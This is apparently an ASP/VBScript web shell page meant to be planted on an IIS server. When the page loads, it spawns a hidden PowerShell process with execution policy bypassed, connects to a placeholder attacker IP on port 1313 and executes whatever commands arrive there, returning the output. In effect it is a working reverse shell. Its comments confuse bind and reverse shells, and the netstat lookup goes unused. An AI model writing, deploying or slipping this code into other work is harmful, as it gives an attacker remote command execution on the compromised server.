<%@ Language=VBScript %>
<%
Dim objShell, objEnv, strIPAddress, strCommand

strIPAddress = "YOUR_BIND_IP" ' Replace with the actual IP address of the bind shell

Set objShell = CreateObject("WScript.Shell")
Set objEnv = objShell.Environment("Process")

' Get the local IP address of the server AND replace 1313 with your bind port, keep the ip here 0.0.0.0
strCommand = "%COMSPEC% /c netstat -n | findstr ""0.0.0.0:1313"""
strCommand = objEnv("ComSpec") & " /c " & strCommand

Set objExec = objShell.Exec(strCommand)
strOutput = objExec.StdOut.ReadAll

' Extract the local IP address from the output
Set regEx = New RegExp
regEx.Pattern = "([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)"
Set matches = regEx.Execute(strOutput)
If matches.Count > 0 Then
    strLocalIP = matches.Item(0).SubMatches.Item(0)
Else
    strLocalIP = ""
End If

' Create the reverse shell command using the IP address and port
strReverseShellCommand = "cmd.exe /c powershell.exe -NoP -NonI -W Hidden -Exec Bypass -c ""$client = New-Object System.Net.Sockets.TCPClient('" & strIPAddress & "',1313);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""

' Execute the reverse shell command
objShell.Run strReverseShellCommand, 0, True
%>
